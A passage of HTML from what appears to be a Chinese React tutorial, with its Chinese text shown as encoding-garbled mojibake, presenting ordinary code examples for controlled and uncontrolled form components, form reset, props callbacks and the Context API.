class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setValue</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// å®Œå…¨æ§åˆ¶è¾“å…¥å€¼</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span>       // <span class="hljs-attr">å€¼ç»‘å®š</span> <span class="hljs-attr">state</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> // <span class="hljs-attr">æ›´æ–°</span> <span class="hljs-attr">state</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤šå­—æ®µä¼˜åŒ–æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MultiFieldForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [formData, setFormData] = <span class="hljs-title function_">useState</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">email</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;&#x27;</span><br>  &#125;);<br><br>  <span class="hljs-comment">// é€šç”¨å˜æ›´å¤„ç†å™¨</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> &#123; name, value &#125; = e.<span class="hljs-property">target</span>;<br>    <span class="hljs-title function_">setFormData</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123; ...prev, [name]: value &#125;));<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;formData.name&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;formData.email&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å³æ—¶éªŒè¯ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">EmailInput</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [email, setEmail] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [isValid, setIsValid] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> value = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;<br>    <span class="hljs-title function_">setEmail</span>(value);<br>    <span class="hljs-title function_">setIsValid</span>(<span class="hljs-regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>.<span class="hljs-title function_">test</span>(value)); <span class="hljs-comment">// å®æ—¶éªŒè¯</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;email&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">      &#123;!isValid &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>é‚®ç®±æ ¼å¼é”™è¯¯<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="éå—æ§ç»„ä»¶æ·±åº¦è§£æ"><a href="#éå—æ§ç»„ä»¶æ·±åº¦è§£æ" class="headerlink" title="éå—æ§ç»„ä»¶æ·±åº¦è§£æ"></a>éå—æ§ç»„ä»¶æ·±åº¦è§£æ</h3><p><strong>å®ç°åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UncontrolledForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    e.<span class="hljs-title function_">preventDefault</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// æäº¤æ—¶è·å–å€¼</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span>          // <span class="hljs-attr">ç»‘å®š</span> <span class="hljs-attr">ref</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">&quot;åˆå§‹å€¼&quot;</span>   // <span class="hljs-attr">ä»…åˆå§‹å€¼</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ–‡ä»¶ä¸Šä¼ åœºæ™¯ï¼ˆå¿…é¡»ä½¿ç”¨éå—æ§ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FileUpload</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> fileRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> file = fileRef.<span class="hljs-property">current</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// å¤„ç†æ–‡ä»¶...</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;fileRef&#125;</span> /&gt;</span> &#123;/* æ— æ³•å—æ§ */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleSubmit&#125;</span>&gt;</span>ä¸Šä¼ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰æ–¹åº“é›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">RichTextEditor</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> editorRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸‰æ–¹ç¼–è¾‘å™¨</span><br>    <span class="hljs-keyword">const</span> editor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThirdPartyEditor</span>(editorRef.<span class="hljs-property">current</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> editor.<span class="hljs-title function_">destroy</span>();<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;editorRef&#125;</span> /&gt;</span></span>; <span class="hljs-comment">// éå—æ§ç®¡ç†</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-3"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-3" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆæ–‡ä»¶è¾“å…¥å¿…é¡»ç”¨éå—æ§ç»„ä»¶ï¼Ÿ</strong></p><ul><li>å®‰å…¨é™åˆ¶ï¼šæµè§ˆå™¨ç¦æ­¢ JavaScript è®¾ç½®æ–‡ä»¶è¾“å…¥å€¼ï¼ˆ<code>&lt;input type=&quot;file&quot;&gt;</code>ï¼‰</li><li>åªè¯»å±æ€§ï¼šæ–‡ä»¶è·¯å¾„ç”±ç”¨æˆ·é€‰æ‹©ï¼Œç¨‹åºæ— æ³•æ§åˆ¶</li><li>æ•°æ®è·å–ï¼šåªèƒ½é€šè¿‡ ref.current.files è·å–æ–‡ä»¶å¯¹è±¡</li></ul><p><strong>Qï¼šå—æ§ç»„ä»¶ç›¸æ¯”éå—æ§æœ‰ä½•ä¼˜åŠ¿ï¼Ÿ</strong></p><ul><li>å³æ—¶éªŒè¯ï¼šæ¯æ¬¡è¾“å…¥éƒ½å¯è§¦å‘éªŒè¯é€»è¾‘</li><li>æ¡ä»¶æ¸²æŸ“ï¼šåŸºäºè¾“å…¥å€¼åŠ¨æ€æ§åˆ¶å…¶ä»– UI</li><li>çŠ¶æ€è¿½æº¯ï¼šå®Œæ•´çš„çŠ¶æ€å†å²è®°å½•</li><li>è¡¨å•é‡ç½®ï¼šè½»æ¾å®ç° reset åŠŸèƒ½ï¼ˆsetState(â€˜â€™)ï¼‰</li></ul><p><strong>Qï¼šå¦‚ä½•å®ç°è¡¨å•é‡ç½®åŠŸèƒ½ï¼Ÿ</strong></p><p>å—æ§ç»„ä»¶æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ResettableForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [form, setForm] = <span class="hljs-title function_">useState</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReset</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setForm</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;); <span class="hljs-comment">// é‡ç½® state</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;form.name&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;/*...*/&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleReset&#125;</span>&gt;</span>é‡ç½®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>éå—æ§ç»„ä»¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ResettableForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> formRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReset</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    formRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">reset</span>(); <span class="hljs-comment">// è°ƒç”¨åŸç”Ÿ DOM reset</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;formRef&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleReset&#125;</span>&gt;</span>é‡ç½®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-ç»„ä»¶é€šä¿¡ï¼ˆçˆ¶å­é€šä¿¡ã€Context-APIã€äº‹ä»¶æ€»çº¿ï¼‰"><a href="#2-4-ç»„ä»¶é€šä¿¡ï¼ˆçˆ¶å­é€šä¿¡ã€Context-APIã€äº‹ä»¶æ€»çº¿ï¼‰" class="headerlink" title="2.4 ç»„ä»¶é€šä¿¡ï¼ˆçˆ¶å­é€šä¿¡ã€Context APIã€äº‹ä»¶æ€»çº¿ï¼‰"></a>2.4 ç»„ä»¶é€šä¿¡ï¼ˆçˆ¶å­é€šä¿¡ã€Context APIã€äº‹ä»¶æ€»çº¿ï¼‰</h2><h3 id="ç»„ä»¶é€šä¿¡æ–¹å¼å…¨æ™¯å›¾"><a href="#ç»„ä»¶é€šä¿¡æ–¹å¼å…¨æ™¯å›¾" class="headerlink" title="ç»„ä»¶é€šä¿¡æ–¹å¼å…¨æ™¯å›¾"></a>ç»„ä»¶é€šä¿¡æ–¹å¼å…¨æ™¯å›¾</h3><pre class="mermaid">graph TD  A[ç»„ä»¶é€šä¿¡] --> B[çˆ¶å­ç»„ä»¶]  A --> C[å…„å¼Ÿç»„ä»¶]  A --> D[ç¥–å­™ç»„ä»¶]  A --> E[ä»»æ„ç»„ä»¶]    B --> B1[Props/å›è°ƒå‡½æ•°]  C --> C1[çŠ¶æ€æå‡]  C --> C2[é€šè¿‡å…±åŒçˆ¶ç»„ä»¶]  D --> D1[Context API]  D --> D2[é€å±‚ä¼ é€’Props]  E --> E1[äº‹ä»¶æ€»çº¿]  E --> E2[çŠ¶æ€ç®¡ç†åº“]</pre><h3 id="çˆ¶å­ç»„ä»¶é€šä¿¡ï¼ˆProps-å›è°ƒï¼‰"><a href="#çˆ¶å­ç»„ä»¶é€šä¿¡ï¼ˆProps-å›è°ƒï¼‰" class="headerlink" title="çˆ¶å­ç»„ä»¶é€šä¿¡ï¼ˆProps + å›è°ƒï¼‰"></a>çˆ¶å­ç»„ä»¶é€šä¿¡ï¼ˆProps + å›è°ƒï¼‰</h3><p><strong>åŸºç¡€æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çˆ¶ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildData</span> = (<span class="hljs-params">childData</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setData</span>(childData);<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">onDataSend</span>=<span class="hljs-string">&#123;handleChildData&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// å­ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; onDataSend &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> onDataSend(&#x27;Hello&#x27;)&#125;&gt;å‘é€æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤šå±‚é€ä¼ é—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç¥–å­™ç»„ä»¶é€šä¿¡ï¼ˆä¸æ¨èï¼‰</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Grandparent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Parent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">&#123; data &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>; <span class="hljs-comment">// ä¸­é—´å±‚è¢«è¿«ä¼ é€’</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">&#123; data &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;data&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç—›ç‚¹ï¼šProps drillingï¼ˆå±æ€§é’»æ¢ï¼‰å¯¼è‡´ä»£ç å†—ä½™</p><h3 id="Context-API-æ·±åº¦è§£æ"><a href="#Context-API-æ·±åº¦è§£æ" class="headerlink" title="Context API æ·±åº¦è§£æ"></a>Context API æ·±åº¦è§£æ</h3><p><strong>æ ¸å¿ƒä¸‰è¦ç´ </strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. åˆ›å»ºContext</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-string">&#x27;light&#x27;</span>); <span class="hljs-comment">// é»˜è®¤å€¼</span><br><br><span class="hljs-comment">// 2. Provider æä¾›æ•°æ®</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;dark&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">setTheme</span> &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 3. Consumer æ¶ˆè´¹æ•°æ®ï¼ˆä¸¤ç§æ–¹å¼ï¼‰</span><br><span class="hljs-comment">// æ–¹å¼1ï¼šuseContext Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; theme &#125; = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>æŒ‰é’®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// æ–¹å¼2ï¼šContext.Consumer</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br><span class="language-xml">      &#123;(&#123; theme &#125;) =&gt; <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span>æŒ‰é’®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Consumer</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯å†™æ³•ï¼šç›´æ¥ä¼ é€’å¯¹è±¡</span><br>&lt;<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span> value=&#123;&#123; theme, setTheme &#125;&#125;&gt;<br>  ...<br>&lt;/<span class="hljs-title class_">MyContext</span>.<span class="hljs-property">Provider</span>&gt;<br><br><span class="hljs-comment">// âœ… æ­£ç¡®æ–¹æ¡ˆï¼šuseMemo ç¼“å­˜å€¼</span><br><span class="hljs-keyword">const</span> contextValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; theme, setTheme &#125;), [theme]);<br><span class="hljs-keyword">return</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MyContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;contextValue&#125;</span>&gt;</span></span><br><span class="language-xml">    ...</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span 